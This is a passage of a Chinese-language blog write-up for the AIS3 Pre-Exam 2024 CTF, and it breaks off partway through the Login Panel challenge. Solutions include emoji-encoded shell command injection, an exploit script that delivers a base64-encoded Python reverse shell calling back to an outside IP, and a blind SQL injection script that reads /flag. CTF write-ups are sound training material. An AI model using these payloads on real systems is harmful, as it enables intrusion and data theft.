<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allrk.2 !!!打得很開心&gt;w&lt;b   Write UpMiscWelcome直接送 :D   Three Dimensional解包後會看到一個封包檔，Follow TCP Stream會看到一坨 G CODE      最後貼去線上NC VIEWER就可以拿FLAG：    Flag:AIS3{b4d1y_tun3d_PriN73r}  Emoji Consol">
<meta property="og:type" content="article">
<meta property="og:title" content="AIS3 PRE EXAM 2024 Write Up">
<meta property="og:url" content="http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allrk.2 !!!打得很開心&gt;w&lt;b   Write UpMiscWelcome直接送 :D   Three Dimensional解包後會看到一個封包檔，Follow TCP Stream會看到一坨 G CODE      最後貼去線上NC VIEWER就可以拿FLAG：    Flag:AIS3{b4d1y_tun3d_PriN73r}  Emoji Consol">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/rkhuugsSR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk8gP0Cm0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sya2KzkV0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJPlqzyVR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1AK8WeVC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJGXPWeER.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJjHvblV0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk2wzDg4R.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1EbOY-NR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJGaz00QA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJInHNx4C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByCuBVg4R.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJ7GYa-ER.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyEQFTZVC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkAvY6bNR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJMOssbEA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyuWJ11EC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJAMkJJ4C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkDskJJNR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJS2k11NR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk5A1JJNC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJn7g1kNC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJmXFy1VC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJTXFJk4C.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1zvtyyNR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJlUsfJEA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJqQ6iWNA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkGfuesBC.png">
<meta property="article:published_time" content="2024-06-29T14:25:30.000Z">
<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/rkhuugsSR.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AIS3 PRE EXAM 2024 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/06/30/mfics-modbus/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/06/16/editorial-htb/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&text=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&is_video=false&description=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 PRE EXAM 2024 Write Up&body=Check out this article: http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&title=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&name=AIS3 PRE EXAM 2024 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/06/29/ais3-pre-exam-2024/&t=AIS3 PRE EXAM 2024 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">2.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome"><span class="toc-number">2.1.1.</span> <span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Three-Dimensional"><span class="toc-number">2.1.2.</span> <span class="toc-text">Three Dimensional</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Emoji-Console"><span class="toc-number">2.1.3.</span> <span class="toc-text">Emoji Console</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Quantum-Nim-Heist"><span class="toc-number">2.1.4.</span> <span class="toc-text">Quantum Nim Heist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hash-Guesser"><span class="toc-number">2.1.5.</span> <span class="toc-text">Hash Guesser</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">2.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Evil-Calculator"><span class="toc-number">2.2.1.</span> <span class="toc-text">Evil Calculator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#It%E2%80%99s-MyGO"><span class="toc-number">2.2.2.</span> <span class="toc-text">It’s MyGO!!!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Login-Panel-Revenge-Revenge"><span class="toc-number">2.2.3.</span> <span class="toc-text">Login Panel Revenge Revenge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Capoost"><span class="toc-number">2.2.4.</span> <span class="toc-text">Capoost</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ebook-Parser"><span class="toc-number">2.2.5.</span> <span class="toc-text">Ebook Parser</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">2.3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mathter"><span class="toc-number">2.3.1.</span> <span class="toc-text">Mathter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rev"><span class="toc-number">2.4.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#The-Long-Print"><span class="toc-number">2.4.1.</span> <span class="toc-text">The Long Print</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%AB%E6%8B%B3%E3%81%AE%E3%82%A8%E3%83%BC%E3%82%B9"><span class="toc-number">2.4.2.</span> <span class="toc-text">火拳のエース</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">2.5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babyRSA"><span class="toc-number">2.5.1.</span> <span class="toc-text">babyRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easyRSA"><span class="toc-number">2.5.2.</span> <span class="toc-text">easyRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zkp"><span class="toc-number">2.5.3.</span> <span class="toc-text">zkp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AIS3 PRE EXAM 2024 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-06-29T14:25:30.000Z" class="dt-published" itemprop="datePublished">2024-06-29</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>rk.2 !!!<br>打得很開心&gt;w&lt;b<br><img src="https://hackmd.io/_uploads/rkhuugsSR.png" alt="image">  </p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h4><p>直接送 :D<br><img src="https://hackmd.io/_uploads/Bk8gP0Cm0.png" alt="image">  </p>
<h4 id="Three-Dimensional"><a href="#Three-Dimensional" class="headerlink" title="Three Dimensional"></a>Three Dimensional</h4><p>解包後會看到一個封包檔，Follow TCP Stream會看到一坨 G CODE  </p>
<p><img src="https://hackmd.io/_uploads/Sya2KzkV0.png" alt="image">  </p>
<p>最後貼去線上<a target="_blank" rel="noopener" href="https://ncviewer.com/">NC VIEWER</a>就可以拿FLAG：<br><img src="https://hackmd.io/_uploads/BJPlqzyVR.png" alt="image">  </p>
<blockquote>
<p>Flag:AIS3{b4d1y_tun3d_PriN73r}</p>
</blockquote>
<h4 id="Emoji-Console"><a href="#Emoji-Console" class="headerlink" title="Emoji Console"></a>Emoji Console</h4><p>用emoji寫bash?!<br><strong>Payload 1</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 ⭐ -&gt; cat *</span><br></pre></td></tr></table></figure>
<p>獲得app.py以及emoji.json，可以做對照，同時知道flag是一個目錄。<br><img src="https://hackmd.io/_uploads/r1AK8WeVC.png" alt="image"><br><strong>Payload 2</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💿 🚩 😜 😶 🐱 ⭐ -&gt; cd flag ;p :| cat *</span><br></pre></td></tr></table></figure>
<p>先cd flag，然後遇到;切割符，最後即便 p :| 是不具意義的執行依然不影響 cat*。<br>找到flag-printer.py：<br><img src="https://hackmd.io/_uploads/SJGXPWeER.png" alt="image"><br><strong>Payload 3</strong><br>執行剛剛那隻程式就好：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💿 🚩 😜 😶 🐍 ⭐ -&gt; cd flag ;p :| python *</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJjHvblV0.png" alt="image">  </p>
<blockquote>
<p>Flag:AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}</p>
</blockquote>
<h4 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h4><p>一個怪怪的Nim遊戲，正常玩必輸<br>玩了幾次，發現玩到後面如果在選單輸入<code>0 0</code>可以讓電腦亂走(?)<br>最後抓準時間認真玩就過了(出洞的點應該是輸入的時候沒有做範圍外判斷)。<br><img src="https://hackmd.io/_uploads/Sk2wzDg4R.png" alt="image">  </p>
<blockquote>
<p>Flag:AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}</p>
</blockquote>
<h4 id="Hash-Guesser"><a href="#Hash-Guesser" class="headerlink" title="Hash Guesser"></a>Hash Guesser</h4><p>一個圖片上傳網站，會隨機生成一個16*16的圖片，最後用這個函數去比對是否一樣：  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageChops</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_same_image</span>(<span class="params">img1: Image.Image, img2: Image.Image</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> ImageChops.difference(img1, img2).getbbox() == <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>其中，ImageChops.difference函數產生的資料大小是<code>min(img1, img2)</code>，這時候只要生成一個大小為一的影像就有1&#x2F;2的機率過：<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_test_image</span>():</span><br><span class="line">    image = Image.new(<span class="string">&quot;L&quot;</span>, (<span class="number">1</span>, <span class="number">1</span>), <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> image</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/r1EbOY-NR.png" alt="image">  </p>
<p><a target="_blank" rel="noopener" href="https://pc-pillow.readthedocs.io/en/latest/ImageChops/ImageChops_difference.html">Reference</a>  </p>
<blockquote>
<p>Flag:AIS3{<a target="_blank" rel="noopener" href="https://github.com/python-pillow/Pillow/issues/2982%7D">https://github.com/python-pillow/Pillow/issues/2982}</a>  </p>
</blockquote>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/calculate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    expression = data[<span class="string">&#x27;expression&#x27;</span>].replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> jsonify(result=<span class="built_in">str</span>(result))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">5001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以發現直接把東西丟到eval處理，但是要避開使用空格和底線<code>_</code><br>在字串中可以利用<code>\x20</code>繞過空格限制<br>最後利用base64編碼以及 <code>exec</code> 的函數搭配 reverse shell payload進行RCE<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">payload=<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.113.193.219&quot;,9003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span></span><br><span class="line">payload=base64.b64encode(payload.encode())</span><br><span class="line">payload=<span class="string">f&#x27;exec(&quot;import\\x20base64;exec(base64.b64decode(<span class="subst">&#123;payload&#125;</span>))&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://chals1.ais3.org:5001/calculate&#x27;</span></span><br><span class="line"></span><br><span class="line">web=req.post(url, json=&#123;<span class="string">&quot;expression&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(web.text)</span><br></pre></td></tr></table></figure>
<p><strong>result</strong><br><img src="https://hackmd.io/_uploads/BJGaz00QA.png" alt="image"></p>
<blockquote>
<p>Flag:AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
</blockquote>
<h4 id="It’s-MyGO"><a href="#It’s-MyGO" class="headerlink" title="It’s MyGO!!!!!"></a>It’s MyGO!!!!!</h4><p>裸裸ㄉSQLI(boolean base)<br>二分搜開下去就好：<br>唯一要注意的是有UNICOODE字元，要搭配hex()函數<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">charset=<span class="string">&#x27;0123456789ABCDEF&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">number, char</span>):</span><br><span class="line">    url=<span class="string">f&#x27;http://chals1.ais3.org:11454/song?id=2 AND HEX(SUBSTRING(LOAD_FILE(&quot;/flag&quot;), 1, <span class="subst">&#123;number&#125;</span>))&gt;=&quot;<span class="subst">&#123;flag+char&#125;</span>&quot;&#x27;</span></span><br><span class="line">    web=req.get(url)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No Data&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> web.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">2</span>:]!=<span class="string">&#x27;7D&#x27;</span>:</span><br><span class="line">    l, r=<span class="number">0</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">while</span> l+<span class="number">1</span>&lt;r:</span><br><span class="line">        mid=(l+r)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#print(l, r)</span></span><br><span class="line">        <span class="keyword">if</span> test(<span class="built_in">len</span>(flag)+<span class="number">1</span>, charset[mid]):</span><br><span class="line">            l=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r=mid</span><br><span class="line">    flag+=charset[l]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag:AIS3{CRYCHIC_Funeral_😭🎸😭🎸😭🎤😭🥁😸🎸}</p>
</blockquote>
<h4 id="Login-Panel-Revenge-Revenge"><a href="#Login-Panel-Revenge-Revenge" class="headerlink" title="Login Panel Revenge Revenge"></a>Login Panel Revenge Revenge</h4><p><strong>unintended solution warning</strong><br>從 <code>views.py</code> 中可以得知帳號密碼為admin&#x2F;admin，而登入後還必須去<code>/2fa</code>輸入正確的2fa代碼才可以拿到flag，另外有一個<code>image</code>的函數可以取得<code>/loginPanel</code>目錄下的內容。</p>
<p><strong>views.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> LoginForm, _2faForm</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> redirect(login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        form = LoginForm(request.POST)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> form.is_valid():</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">f&#x27;/login?error=Invalid CAPTCHA&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (form.cleaned_data[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> form.cleaned_data[<span class="string">&quot;password&quot;</span>] == <span class="string">&quot;admin&quot;</span>): </span><br><span class="line">            request.session[<span 